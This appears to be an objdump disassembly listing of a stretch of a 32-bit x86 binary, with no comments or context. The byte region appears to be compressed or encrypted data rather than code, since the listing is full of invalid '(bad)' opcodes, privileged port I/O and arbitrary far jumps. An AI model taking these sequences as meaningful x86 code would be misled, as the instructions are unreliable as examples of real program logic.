  422969:	sub    eax,0xf123dd7d
  42296e:	lea    ecx,[ecx-0x49]
  422971:	adc    al,0xa9
  422973:	mov    bl,0x26
  422975:	dec    eax
  422976:	and    edx,DWORD PTR [ecx-0x334bc2b8]
  42297c:	jecxz  0x42290e
  42297e:	in     eax,dx
  42297f:	jle    0x422908
  422981:	dec    eax
  422982:	sbb    edi,DWORD PTR gs:[esi+0x38]
  422986:	loopne 0x42299a
  422988:	lods   al,BYTE PTR ds:[esi]
  422989:	add    eax,0x963eca7d
  42298e:	in     eax,0xbd
  422990:	inc    esp
  422991:	mov    ebp,0xf95d611e
  422996:	mov    bl,0xfa
  422998:	sbb    al,0xd5
  42299a:	mov    edx,0x6f2ce0b2
  42299f:	push   esi
  4229a0:	hlt    
  4229a1:	sbb    al,BYTE PTR [eax]
	...
  4229ab:	add    BYTE PTR [eax],al
  4229ad:	add    BYTE PTR [edx],dh
  4229af:	ror    esi,cl
  4229b1:	mov    ds:0xd37ebfef,al
  4229b6:	sub    edi,DWORD PTR [esi]
  4229b8:	out    0x3f,eax
  4229ba:	ds jae 0x422a1f
  4229bd:	mov    ds:0x1d1a1,eax
  4229c2:	pop    esp
  4229c3:	add    BYTE PTR [eax],al
  4229c5:	add    cl,cl
  4229c7:	fst    DWORD PTR [edi+0x61b61374]
  4229cd:	inc    edi
  4229ce:	or     DWORD PTR [eax+0x4f],0xb3f2f83d
  4229d5:	shl    BYTE PTR [esi],0x54
  4229d8:	mov    edx,0x94ddb2ed
  4229dd:	jbe    0x422968
  4229df:	sar    BYTE PTR [edi-0x64],0x87
  4229e3:	mov    esp,0xf9ce1b32
  4229e8:	int    0x36
  4229ea:	(bad)  
  4229eb:	arpl   WORD PTR [ebp-0x72],bx
  4229ee:	in     al,dx
  4229ef:	jle    0x422a2a
  4229f1:	rcr    DWORD PTR [eax+eax*8-0x5c082139],cl
  4229f8:	sahf   
  4229f9:	sub    BYTE PTR [ecx],ah
  4229fb:	sub    dl,ch
  4229fd:	div    BYTE PTR [ebp-0x4f]
  422a00:	dec    eax
  422a01:	dec    eax
  422a02:	jo     0x4229b0
  422a04:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  422a06:	jg     0x422a12
  422a08:	mov    ecx,0x6ff3f995
  422a0d:	mov    ecx,gs
  422a0f:	jg     0x4229af
  422a11:	xor    eax,edx
  422a13:	pop    eax
  422a14:	sbb    al,0xd5
  422a16:	(bad)  
  422a17:	xor    cl,BYTE PTR [ebp+0x38]
  422a1a:	iret   
  422a1b:	shl    edx,0x13
  422a1e:	mov    ebp,0x3ad46e
	...
  422a2b:	add    BYTE PTR [eax],al
  422a2d:	add    bl,bl
  422a2f:	in     eax,dx
  422a30:	outs   dx,BYTE PTR ds:[esi]
  422a31:	and    bh,BYTE PTR [esi-0x5d]
  422a34:	(bad)  
  422a36:	pop    esi
  422a37:	(bad)  
  422a38:	mov    DWORD PTR [ebp+0x49903eca],ecx
  422a3e:	std    
  422a3f:	rol    DWORD PTR [ecx],1
  422a41:	add    BYTE PTR [eax+eax*1+0x0],bl
  422a45:	add    bl,ah
  422a47:	add    eax,DWORD PTR [eax+eax*2]
  422a4a:	or     al,0x9c
  422a4c:	popa   
  422a4d:	out    dx,al
  422a4e:	mov    ds:0xe0f83f60,eax
  422a53:	out    0xd9,al
  422a55:	push   esi
  422a56:	push   ebx
  422a57:	shl    BYTE PTR [ebx-0x7c],0x19
  422a5b:	dec    edx
  422a5c:	mov    edx,0xdc01d79d
  422a61:	adc    eax,0x4abd9ac3
  422a66:	loopne 0x422ae1
  422a68:	push   edi
  422a69:	sub    DWORD PTR [edx+0x42],eax
  422a6c:	loopne 0x422a29
  422a6e:	push   ebp
  422a6f:	push   eax
  422a70:	pop    edi
  422a71:	test   eax,0xa67d2fcb
  422a76:	loop   0x422a75
  422a78:	pop    ecx
  422a79:	and    DWORD PTR [ecx],eax
  422a7b:	lds    edi,FWORD PTR [ebx]
  422a7d:	push   ebx
  422a7e:	mov    ds:0x23e7e6bd,al
  422a83:	push   ss
  422a84:	mov    dh,0xe9
  422a86:	(bad)  
  422a87:	out    dx,al
  422a88:	mov    bh,0x97
  422a8a:	rol    BYTE PTR [ebp+0x1be8e6e2],cl
  422a90:	adc    ebx,eax
  422a92:	test   al,0x28
  422a94:	loope  0x422a4b
  422a96:	xor    eax,0xa4e0c3f9
  422a9b:	pop    edx
  422a9c:	inc    esp
  422a9d:	inc    ebp
  422a9e:	mov    ds:0x3310b9,eax
	...
  422aab:	add    BYTE PTR [eax],al
  422aad:	add    BYTE PTR ds:0x6f976b22,al
  422ab3:	(bad)  
  422ab5:	mov    dl,0x66
  422ab7:	and    BYTE PTR [esi+0x426c076a],ah
  422abd:	mov    ebx,0x1d259
  422ac2:	pop    esp
  422ac3:	add    BYTE PTR [eax],al
  422ac5:	add    BYTE PTR [esi+0x76],ah
  422ac8:	and    DWORD PTR [eax+0x45],esi
  422acb:	sub    BYTE PTR [edx+0x38],bh
  422ace:	add    edx,DWORD PTR [edx-0x47dad19e]
  422ad4:	sbb    BYTE PTR [edi+0x74],dl
  422ad7:	and    esi,DWORD PTR [esi+edx*2+0x53]
  422adb:	dec    ebx
  422adc:	push   ss
  422add:	adc    dh,BYTE PTR [ebx]
  422adf:	or     esp,DWORD PTR [eax]
  422ae1:	adc    al,bh
  422ae3:	add    DWORD PTR [edi+0x72c857e6],ebx
  422ae9:	data16 xlat BYTE PTR ds:[ebx]
  422aeb:	(bad)  [edx+0xe7e01f]
  422af1:	add    bl,ch
  422af3:	jno    0x422a9f
  422af5:	outs   dx,BYTE PTR ds:[esi]
  422af6:	mov    dl,0x1a
  422af8:	mov    ds:0x3e3f0320,al
  422afd:	pop    ebx
  422afe:	outs   dx,BYTE PTR ds:[esi]
  422aff:	cmp    ebp,DWORD PTR ds:0x4e3972e5
  422b05:	cdq    
  422b06:	dec    edx
  422b07:	les    ebx,FWORD PTR [eax+0x65a1037d]
  422b0d:	ror    dl,1
  422b0f:	sbb    edi,DWORD PTR [eax-0x3f4f90ea]
  422b15:	pop    esi
  422b16:	cs (bad) 
  422b18:	xchg   ebx,eax
  422b19:	nop
  422b1a:	xchg   edi,eax
  422b1b:	dec    ebp
  422b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b1d:	in     eax,dx
  422b1e:	fsubp  st(2),st
  422b20:	es jae 0x422b23
	...
  422b2b:	add    BYTE PTR [eax],al
  422b2d:	add    BYTE PTR [ebx+0x7fd924d4],cl
  422b33:	stc    
  422b34:	call   esi
  422b36:	into   
  422b37:	inc    ebp
  422b38:	mov    bh,0x11
  422b3a:	xchg   edi,eax
  422b3b:	dec    ebp
  422b3c:	xor    DWORD PTR [ecx+0x1d2b5],ebp
  422b42:	pop    esp
  422b43:	add    BYTE PTR [eax],al
  422b45:	add    BYTE PTR [ecx],bl
  422b47:	test   eax,0xf6c58bc0
  422b4c:	jno    0x422b2f
  422b4e:	add    eax,0x52fcede2
  422b53:	mov    ds:0xf036c4b9,al
  422b58:	popf   
  422b59:	cmp    BYTE PTR [esi-0x50],0xd0
  422b5d:	dec    edi
  422b5e:	xchg   esi,eax
  422b5f:	aas    
  422b60:	jmp    0x422b48
  422b62:	cmc    
  422b63:	bound  edi,QWORD PTR [ecx]
  422b65:	or     al,0xbb
  422b67:	push   ecx
  422b68:	xchg   dl,ah
  422b6a:	pop    ebp
  422b6b:	pushf  
  422b6c:	sbb    ah,BYTE PTR [edi]
  422b6e:	rcr    BYTE PTR [edx+0xb49ffdd],cl
  422b74:	bound  ecx,QWORD PTR [edx+0x37]
  422b77:	in     al,dx
  422b78:	jmp    0x904:0xa61b3089
  422b7f:	shl    DWORD PTR [edx],1
  422b81:	mov    eax,ds:0x49210f85
  422b86:	(bad)  
  422b87:	aam    0x90
  422b89:	cmp    ch,ah
  422b8b:	mov    gs,WORD PTR [ebx]
  422b8d:	xchg   ebp,eax
  422b8e:	pusha  
  422b8f:	mov    ds:0x55f532ae,eax
  422b94:	(bad)
  422b97:	ficomp WORD PTR [edx]
  422b99:	je     0x422b1e
  422b9b:	cmp    ah,BYTE PTR [esi]
  422b9d:	and    al,0xdd
  422b9f:	dec    edi
  422ba0:	mov    eax,ds:0x2d
	...
  422bad:	add    dh,bl
  422baf:	sub    DWORD PTR [eax-0x210c002e],ebx
  422bb5:	sub    eax,0x4af35f6
  422bba:	in     eax,0xa0
  422bbc:	push   ecx
  422bbd:	lock adc ebx,edx
  422bc0:	add    DWORD PTR [eax],eax
  422bc2:	pop    esp
  422bc3:	add    BYTE PTR [eax],al
  422bc5:	add    BYTE PTR [edx-0x15],al
  422bc8:	fwait
  422bc9:	lea    eax,[ebp+edi*2-0x46]
  422bcd:	(bad)  
  422bce:	xor    DWORD PTR [esi],ebp
  422bd0:	fsub   DWORD PTR [edi+0x31]
  422bd3:	mov    al,ds:0x209247ca
  422bd8:	dec    edi
  422bd9:	sub    esp,esp
  422bdb:	sub    ah,ah
  422bdd:	call   0x46f3:0x446e8cc0
  422be4:	mov    eax,0x11f867f7
  422be9:	inc    edx
  422bea:	push   esi
  422beb:	cmp    cl,BYTE PTR ds:0xc1700aeb
  422bf1:	push   edi
  422bf2:	cli    
  422bf3:	and    bh,ah
  422bf5:	pop    ss
  422bf6:	jo     0x422c56
  422bf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bf9:	lods   eax,DWORD PTR ds:[esi]
  422bfa:	xchg   DWORD PTR [ebp-0xb],eax
  422bfd:	sbb    al,0xdd
  422bff:	das    
  422c00:	dec    edi
  422c01:	and    cl,BYTE PTR [eax+0x2b]
  422c04:	mov    bh,0x37
  422c06:	cmc    
  422c07:	sbb    al,0x7c
  422c09:	repz jg 0x422b8c
  422c0c:	rcr    BYTE PTR [esi+eiz*4+0xd],cl
  422c10:	and    ebx,DWORD PTR [edx]
  422c12:	out    0xb1,eax
  422c14:	inc    edi
  422c15:	cld    
  422c16:	loopne 0x422b9b
  422c18:	xlat   BYTE PTR ds:[ebx]
  422c19:	and    DWORD PTR [ebx],esi
  422c1b:	out    0x6f,al
  422c1d:	mov    eax,ds:0x743cd477
	...
  422c2e:	dec    esi
  422c2f:	aas    
  422c30:	int3   
  422c31:	sbb    eax,0x7fdffffd
  422c36:	out    dx,eax
  422c37:	loopne 0x422c4f
  422c39:	lods   al,BYTE PTR ds:[esi]
  422c3a:	add    eax,0x6dbad42c
  422c3f:	rol    DWORD PTR [ecx],cl
  422c41:	add    BYTE PTR [eax+eax*1+0x0],bl
  422c45:	add    BYTE PTR [esi],ch
  422c47:	mov    ecx,0x67549a59
  422c4c:	clc    
  422c4d:	jnp    0x422be0
  422c4f:	cmp    DWORD PTR [eax+0x63],0x368777cf
  422c56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c57:	scas   eax,DWORD PTR es:[edi]
  422c58:	cmp    dh,BYTE PTR [edx-0x65]
  422c5b:	out    0x8a,al
  422c5d:	add    ah,dl
  422c5f:	inc    edx
  422c60:	mov    ecx,0xe8d91c6a
  422c65:	repnz arpl WORD PTR [ebx+0x13],di
  422c69:	pop    esi
  422c6a:	xchg   DWORD PTR [edx+0x75],ebp
  422c6d:	mov    dh,0x1c
  422c6f:	sbb    al,bl
  422c71:	jns    0x422ca3
  422c73:	sub    dl,BYTE PTR [esi+ebx*1-0x20]
  422c77:	xchg   edi,eax
  422c78:	cs into 
  422c7a:	xchg   ecx,eax
  422c7b:	pop    edx
  422c7c:	inc    ecx
  422c7d:	add    eax,0xbc9c348e
  422c82:	scas   al,BYTE PTR es:[edi]
  422c83:	add    ecx,edx
  422c85:	clc    
  422c86:	jecxz  0x422c9a
  422c88:	mov    ds:0x18ba56b4,al
  422c8d:	shl    edi,cl
  422c8f:	int3   
  422c90:	and    al,0x48
  422c92:	xchg   ebp,eax
  422c93:	sub    bl,cl
  422c95:	repz ja 0x422cf7
  422c98:	call   0x5242:0x79494f95
  422c9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ca0:	cmp    al,0xa8
	...
  422cae:	push   ds
  422caf:	test   eax,0x7ff735f6
  422cb4:	fild   QWORD PTR [ebx-0x5f9ed871]
  422cba:	nop
  422cbb:	data16 clc 
  422cbd:	mov    cl,cl
  422cbf:	rol    DWORD PTR [ecx],cl
  422cc1:	add    BYTE PTR [eax+eax*1+0x0],bl
  422cc5:	add    BYTE PTR [esi],al
  422cc7:	nop
  422cc8:	mov    ebp,0xe95826b0
  422ccd:	test   DWORD PTR [edi+eiz*4],ecx
  422cd0:	(bad)  
  422cd1:	xlat   BYTE PTR ds:[ebx]
  422cd2:	push   edx
  422cd3:	call   0x97:0xaa03f39c
  422cda:	out    0x6e,al
  422cdc:	pop    ds
  422cdd:	fs test al,0x1c
  422ce0:	ins    DWORD PTR es:[edi],dx
  422ce1:	inc    esi
  422ce2:	call   0xd9c5ca6a
  422ce7:	jl     0x422c82
  422ce9:	xor    DWORD PTR [esi-0x62],edx
  422cec:	js     0x422cd2
  422cee:	add    DWORD PTR [edx+0x4e],0xee5fff05
  422cf5:	sbb    BYTE PTR [edi-0x2f7df924],0x3e
  422cfc:	cmp    eax,0x6ac4742
  422d01:	mov    WORD PTR ds:0xd42fa0f6,fs
  422d07:	leave  
  422d08:	mov    edi,0xe882a289
  422d0d:	inc    ebp
  422d0e:	mov    bh,BYTE PTR [eax+0x4]
  422d11:	imul   edx,DWORD PTR [eax-0x189fe121],0xbae3c311
  422d1b:	(bad)  
  422d1c:	cwde   
  422d1d:	mov    cl,0x5d
  422d1f:	push   edx
  422d20:	ror    BYTE PTR ds:0x0,cl
	...
  422d2e:	fwait
  422d2f:	loope  0x422d9e
  422d31:	sub    eax,0xf7dbad7f
  422d36:	sar    BYTE PTR [ebx],cl
  422d38:	(bad)  
  422d39:	add    dh,al
  422d3b:	and    ch,BYTE PTR ds:0x1d42511
  422d41:	add    BYTE PTR [eax+eax*1+0x0],bl
  422d45:	add    dh,al
  422d47:	pop    edx
  422d48:	jnp    0x422d74
  422d4a:	repnz pop edx
  422d4c:	pusha  
  422d4d:	cli    
  422d4e:	shl    esp,cl
  422d50:	mov    ds:0xf6a0518a,al
  422d55:	in     eax,dx
  422d56:	mov    ecx,0x2425d1d8
  422d5b:	and    ah,ah
  422d5d:	punpckldq mm5,mm0
  422d60:	stos   DWORD PTR es:[edi],eax
  422d61:	cld    
  422d62:	sbb    eax,0x8d19eabf
  422d67:	ins    BYTE PTR es:[edi],dx
  422d68:	repnz and eax,ebx
  422d6b:	sbb    eax,DWORD PTR [ecx]
  422d6d:	(bad)  
  422d6e:	lahf   
  422d6f:	out    0xa5,al
  422d71:	pop    eax
  422d72:	mov    esi,0x96783628
  422d77:	xor    al,BYTE PTR [edx-0xb]
  422d7a:	call   0x328a:0x549437d7
  422d81:	mov    dl,0x8a
  422d83:	or     al,0x5c
  422d85:	jo     0x422dc8
  422d87:	xor    edi,edi
  422d89:	or     al,0xa1
  422d8b:	es dec eax
  422d8d:	pop    edx
  422d8e:	mov    cl,0x6c
  422d90:	inc    ebx
  422d91:	pop    esp
  422d92:	(bad)  
  422d94:	mov    eax,ds:0x3de115f9
  422d99:	push   eax
  422d9a:	xor    DWORD PTR [edi+0x5311ce12],edx
  422da0:	das    
  422da1:	jne    0x422da3
	...
  422dab:	add    BYTE PTR [eax],al
  422dad:	add    BYTE PTR [eax],cl
  422daf:	div    DWORD PTR [edi+0x4a]
  422db2:	dec    edx
  422db4:	cmp    eax,0x2e8eedf7
  422db9:	dec    eax
  422dba:	repz xor BYTE PTR [ebx+0x62],ah
  422dbe:	adc    esp,0x5c0001
  422dc4:	add    BYTE PTR [eax],al
  422dc6:	aam    0xc2
  422dc8:	add    BYTE PTR [esi-0x690e64a0],al
  422dce:	dec    esp
  422dcf:	add    al,cl
  422dd1:	sub    ch,dh
  422dd3:	lods   al,BYTE PTR ds:[esi]
  422dd4:	cmp    al,0xe6
  422dd6:	xchg   edi,eax
  422dd7:	test   DWORD PTR [esi],0xa315fc1b
  422ddd:	push   edx
  422dde:	das    
  422ddf:	jg     0x422e50
  422de1:	test   BYTE PTR [ecx+0x1a],dl
  422de4:	mov    bl,0xad
  422de6:	lds    ebx,FWORD PTR [esi+0x15e13579]
  422dec:	in     eax,0xd7
  422dee:	lahf   
  422def:	es inc ebp
  422df1:	ja     0x422e49
  422df3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422df4:	add    al,0x42
  422df6:	mov    ebp,0x93731710
  422dfb:	iret   
  422dfc:	sub    eax,0x8996fdc6
  422e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e02:	and    eax,DWORD PTR [ebx-0x8]
  422e05:	mov    al,BYTE PTR [eax+0x2c]
  422e08:	xor    BYTE PTR [edi+0x6f],ch
  422e0b:	xchg   esi,eax
  422e0c:	lea    ebx,[edx+0x13ad1f12]
  422e12:	lahf   
  422e13:	stos   DWORD PTR es:[edi],eax
  422e14:	inc    eax
  422e15:	xor    al,0x27
  422e17:	icebp  
  422e18:	and    al,0x91
  422e1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e1b:	fcom   DWORD PTR [edi]
  422e1d:	xor    BYTE PTR [edx+0x6eee4e],dh
	...
  422e2b:	add    BYTE PTR [eax],al
  422e2d:	add    BYTE PTR [esi],dh
  422e2f:	arpl   WORD PTR [eax-0x10],bp
  422e32:	jge    0x422e2f
  422e34:	mov    esi,0x8c7853e7
  422e39:	daa    
  422e3a:	daa    
  422e3b:	in     al,0xbc
  422e3d:	pop    ebx
  422e3e:	fst    st(4)
  422e40:	add    DWORD PTR [eax],eax
  422e42:	pop    esp
  422e43:	add    BYTE PTR [eax],al
  422e45:	add    BYTE PTR [ecx+0x5f],dl
  422e48:	(bad)
  422e4c:	aaa    
  422e4d:	add    edi,0x897e2a77
  422e53:	mov    ecx,0xd1175c1b
  422e58:	(bad)  
  422e59:	out    0xa9,eax
  422e5b:	push   edi
  422e5c:	cmc    
  422e5d:	jmp    0x422e0c
  422e5f:	stos   DWORD PTR es:[edi],eax
  422e60:	pop    edx
  422e61:	xor    edi,DWORD PTR [edi+0x4216a989]
  422e67:	dec    edx
  422e68:	fdiv   st,st(0)
  422e6a:	data16 cmp ah,BYTE PTR [eax]
  422e6d:	adc    eax,0x8132cca1
  422e72:	inc    esi
  422e73:	push   esp
  422e74:	or     al,0x3d
  422e76:	int3   
  422e77:	es dec edi
  422e79:	shl    BYTE PTR [eax+0x53072865],1
  422e7f:	popa   
  422e80:	rcr    esp,cl
  422e82:	shl    BYTE PTR [eax+0x71f2bd51],0x96
  422e89:	rcr    edx,0xe
  422e8c:	inc    ecx
  422e8d:	mov    DWORD PTR [ecx+0x72],ebx
  422e90:	cld    
  422e91:	in     eax,0xab
  422e93:	fincstp 
  422e95:	fs pop esi
  422e97:	jl     0x422e5d
  422e99:	or     eax,0x97f49dc6
  422e9e:	jb     0x422e71
  422ea0:	scas   eax,DWORD PTR es:[edi]
  422ea1:	int3   
	...
  422eae:	daa    
  422eaf:	push   ecx
  422eb0:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  422eba:	lock push es
  422ebc:	out    dx,al
  422ebd:	cmp    DWORD PTR [ecx+0x5c0001db],esi
  422ec3:	add    BYTE PTR [eax],al
  422ec5:	add    ch,ah
  422ec7:	cs inc edx
  422ec9:	sub    ebx,ecx
  422ecb:	dec    edx
  422ecc:	mov    esp,0x78296f15
  422ed1:	mov    ebx,0x594b5b26
  422ed6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ed7:	aaa    
  422ed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ed9:	out    0xf6,al
  422edb:	push   ebx
  422edc:	popa   
  422edd:	mov    bh,0x5c
  422edf:	bound  esp,QWORD PTR [esi+0x14f80ac0]
  422ee5:	jge    0x422e98
  422ee7:	mov    eax,0xd149317a
  422eec:	cwde   
  422eed:	xchg   esi,eax
  422eee:	retf   0xa739
  422ef1:	cmp    ebx,DWORD PTR [ebp+0x7c]
  422ef4:	pushf  
  422ef5:	jg     0x422eac
  422ef7:	sub    dh,0xf6
  422efa:	xor    al,0x82
  422efc:	std    
  422efd:	and    BYTE PTR [esi-0xd],dh
  422f00:	cwde   
  422f01:	int3   
  422f02:	clc    
  422f03:	scas   eax,DWORD PTR es:[edi]
  422f04:	jge    0x422f81
  422f06:	inc    eax
  422f07:	xchg   BYTE PTR [eax+0x70ea13ba],cl
  422f0d:	xchg   edx,eax
  422f0e:	add    esp,ecx
  422f10:	or     al,0x28
  422f12:	cmp    BYTE PTR [edi-0x6b],dl
  422f15:	adc    DWORD PTR [ebx+edi*8+0x32b257a],eax
  422f1c:	test   BYTE PTR [edi+0x4],ch
  422f1f:	sti    
  422f20:	je     0x422f75
	...
  422f2e:	daa    
  422f2f:	ss lahf 
  422f31:	xor    DWORD PTR [edi+0x1536afb9],ebx
  422f37:	and    eax,0x9420075b
  422f3c:	fs inc esp
  422f3e:	or     eax,0x5c0001dc
  422f43:	add    BYTE PTR [eax],al
  422f45:	add    dh,dh
  422f47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f48:	out    0x45,al
  422f4a:	out    0xf4,eax
  422f4c:	stos   BYTE PTR es:[edi],al
  422f4d:	push   edx
  422f4e:	ds dec edi
  422f50:	dec    ecx
  422f51:	add    al,0x49
  422f53:	retf   0xbc15
  422f56:	shr    DWORD PTR [edi-0x7d0a5d89],1
  422f5c:	fsub   QWORD PTR [edi+eax*8-0x5b8ee6c4]
  422f63:	mov    DWORD PTR [edx-0x4b],0xe95e3d5e
  422f6a:	aad    0xf9
  422f6c:	dec    ecx
  422f6d:	mov    ebx,0xb110c9bd
  422f72:	xor    edx,ebp
  422f74:	or     edi,DWORD PTR [ebp+0x50c9c367]
  422f7a:	test   al,0xfc
  422f7c:	aas    
  422f7d:	aas    
  422f7e:	hlt    
  422f7f:	cmove  edx,DWORD PTR [eax+0x7535bc8a]
  422f86:	test   al,0x61
  422f88:	cwde   
  422f89:	lods   eax,DWORD PTR ds:[esi]
  422f8a:	out    dx,al
  422f8b:	dec    esi
  422f8c:	out    0x95,al
  422f8e:	aad    0x4a
  422f90:	sub    ecx,eax
  422f92:	stos   BYTE PTR es:[edi],al
  422f93:	imul   edx,DWORD PTR [edi+0x35],0x12e258fe
  422f9a:	xchg   ebx,eax
  422f9b:	dec    ebx
  422f9c:	pop    ebx
  422f9d:	xchg   ebx,eax
  422f9e:	add    DWORD PTR [edi+0x6a56],edi
	...
  422fac:	add    BYTE PTR [eax],al
  422fae:	aaa    
  422faf:	(bad)  
  422fb0:	out    0xc2,eax
  422fb2:	mul    ebx
  422fb4:	aaa    
  422fb5:	cmc    
  422fb6:	xchg   ecx,eax
  422fb7:	call   0x5f11:0xd91feef4
  422fbe:	imul   ebx,esp,0x5c0001
  422fc4:	add    BYTE PTR [eax],al
  422fc6:	ja     0x423027
  422fc8:	dec    edx
  422fc9:	xchg   BYTE PTR [ebp+ecx*4-0x50ff7503],al
  422fd0:	push   esp
  422fd1:	mov    ebx,0x4c86dc4a
  422fd6:	sub    esp,DWORD PTR [eax+0x15c04281]
  422fdc:	jnp    0x422f72
  422fde:	cmp    esi,DWORD PTR [eax]
  422fe0:	lea    edx,[ebx-0x4d]
  422fe3:	in     al,0x3b
  422fe5:	clc    
  422fe6:	fld    QWORD PTR [ecx]
  422fe8:	(bad)  
  422fea:	push   0xffffffa9
  422fec:	cmp    dh,BYTE PTR [esi+0x15]
  422fef:	mov    ebp,0x1c8cdfdc
  422ff4:	xor    al,0xd
  422ff6:	cli    
  422ff7:	adc    eax,0x2da73377
  422ffc:	push   ecx
  422ffd:	cmp    al,0x9f
  422fff:	dec    ebp
  423000:	lock and BYTE PTR [eax-0x4d],ah
  423004:	and    DWORD PTR [edi],esp
  423006:	jle    0x422ffc
  423008:	mov    edx,0x24dc493f
  42300d:	and    DWORD PTR [esi],0xffffff84
  423010:	aam    0x28
  423012:	inc    ebp
  423013:	push   esi
  423014:	push   ecx
  423015:	in     al,0xfc
  423017:	sub    al,0xff
  423019:	ret    0x5dcb
  42301c:	fcom   QWORD PTR [edi-0x76145f76]
	...
  42302e:	push   ss
  42302f:	aad    0xdf
  423031:	out    dx,eax
  423032:	fucomip st,st(7)
  423034:	ss std 
  423036:	cmp    BYTE PTR [esi+0x30eb5f3a],al
  42303c:	sbb    bp,ax
  42303f:	fadd   QWORD PTR [ecx]
  423041:	add    BYTE PTR [eax+eax*1+0x0],bl
  423045:	add    BYTE PTR [eax],ch
  423047:	pusha  
  423048:	aas    
  423049:	iret   
  42304a:	mov    ss,ebp
  42304c:	inc    esi
  42304d:	shl    BYTE PTR [esi+0x615d074],cl
  423053:	iret   
  423054:	test   BYTE PTR [edi],dl
  423056:	push   0x2fd0fd6e
  42305b:	mov    eax,ds:0xd89c3d2d
  423060:	adc    DWORD PTR [ecx+0x5f446e33],0xffffff84
  423067:	adc    bh,BYTE PTR [ebx+0x5a]
  42306a:	pop    edi
  42306b:	sbb    DWORD PTR [eax+0x3f],edi
  42306e:	jmp    0x423037
  423070:	cmp    dh,BYTE PTR [eax+0x6e]
  423073:	rcl    BYTE PTR [ebx],0x80
  423076:	mov    dh,0x5e
  423078:	and    BYTE PTR [edi-0x6c5ed563],bh
  42307e:	aaa    
  42307f:	adc    al,0xe6
  423081:	dec    esi
  423082:	neg    DWORD PTR [eax+0x2a]
  423085:	sub    BYTE PTR [eax],bh
  423087:	iret   
  423088:	ffree  st(7)
  42308a:	inc    edi
  42308b:	lods   eax,DWORD PTR ds:[esi]
  42308c:	popf   
  42308d:	or     al,0x11
  42308f:	test   eax,0xb1c32fc4
  423094:	loope  0x42304e
  423096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423097:	xchg   ebx,eax
  423098:	sbb    ebx,DWORD PTR [edi+0x4e148362]
  42309e:	imul   edx,DWORD PTR [esi],0x1ce2
	...
  4230ac:	add    BYTE PTR [eax],al
  4230ae:	outs   dx,BYTE PTR ds:[esi]
  4230af:	jbe    0x423095
  4230b1:	retf   0xdafc
  4230b4:	outs   dx,BYTE PTR ds:[esi]
  4230b5:	neg    BYTE PTR [eax]
  4230b7:	xchg   edx,eax
  4230b8:	xchg   DWORD PTR [edi+0x65a201b6],edx
  4230be:	and    ebp,ebx
  4230c0:	add    DWORD PTR [eax],eax
  4230c2:	pop    esp
  4230c3:	add    BYTE PTR [eax],al
  4230c5:	add    BYTE PTR ds:0x55802a90,cl
  4230cb:	or     eax,0x8b1bea32
  4230d0:	aad    0x28
  4230d2:	cwde   
  4230d3:	shl    DWORD PTR [edi+ecx*2],0x10
  4230d7:	sbb    eax,0xda2b9eb5
  4230dc:	xchg   ebx,eax
  4230dd:	scas   eax,DWORD PTR es:[edi]
  4230de:	cwde   
  4230df:	fstp   TBYTE PTR [esi+0x194253ee]
  4230e5:	mov    edx,0x46a3c5ec
  4230ea:	fs sahf 
  4230ec:	gs inc edx
  4230ee:	shl    BYTE PTR [esi-0x7aba1174],0xde
  4230f5:	hlt    
  4230f6:	pop    esi
  4230f7:	fst    QWORD PTR [ecx]
  4230f9:	mov    ah,0xf6
  4230fb:	jo     0x423127
  4230fd:	add    DWORD PTR ds:0xb09c8b77,ecx
  423103:	not    BYTE PTR [eax]
  423105:	mov    DWORD PTR [esi+ebp*1],ebx
  423108:	cmp    al,0x10
  42310b:	mov    bh,0xdd
  42310d:	pop    ds
  42310e:	sbb    bh,bl
  423110:	outs   dx,BYTE PTR ds:[esi]
  423111:	fiadd  WORD PTR [edi+0x6fa0c5e9]
  423117:	add    dl,BYTE PTR [esi+0x1c60d688]
  42311d:	adc    al,0xd
  42311f:	ss daa 
  423121:	adc    eax,DWORD PTR [eax]
	...
  42312b:	add    BYTE PTR [eax],al
  42312d:	add    BYTE PTR [edx],bh
  42312f:	push   edx
  423130:	les    ecx,FWORD PTR [edi]
  423132:	in     al,dx
  423133:	lahf   
  423134:	sti    
  423135:	ja     0x42312d
  423137:	rcl    DWORD PTR [eax+0x2053aed3],1
  42313d:	mov    ds:0x1dd7d,eax
  423142:	pop    esp
  423143:	add    BYTE PTR [eax],al
  423145:	add    BYTE PTR [edi+ebx*1+0x26786d20],bl
  42314c:	popa   
  42314d:	xchg   edi,eax
  42314e:	jmp    0x4aeb:0xc315bd5a
  423155:	jae    0x423162
  423157:	arpl   WORD PTR [esi-0x66],cx
  42315a:	push   ss
  42315b:	dec    ebx
  42315d:	push   es
  42315e:	fidiv  DWORD PTR [eax+edi*2-0x1a347642]
  423165:	mov    edx,0xf0e5e085
  42316a:	fiadd  WORD PTR [esi-0x3e]
  42316d:	mov    ds:0xfbc8a081,al
  423172:	mov    ebp,0x9270c62e
  423177:	leave  
  423178:	mov    ebx,0x249b7cac
  42317d:	inc    eax
  42317e:	xlat   BYTE PTR ds:[ebx]
  42317f:	push   es
  423180:	loop   0x4231d2
  423182:	das    
  423183:	adc    al,bh
  423185:	bound  eax,QWORD PTR [edi+0x15]
  423188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42318a:	test   DWORD PTR [ebx-0x48],edx
  42318d:	inc    esi
  42318e:	sub    DWORD PTR [eax-0x2d],esp
  423191:	sahf   
  423192:	dec    edi
  423193:	sbb    BYTE PTR [ecx-0x53],0x7b
  423197:	(bad)  
  423198:	sub    BYTE PTR [edx+0x19d44f4d],dh
  42319e:	cli    
  42319f:	sar    DWORD PTR [edx],cl
  4231a1:	push   0x0
	...
  4231ab:	add    BYTE PTR [eax],al
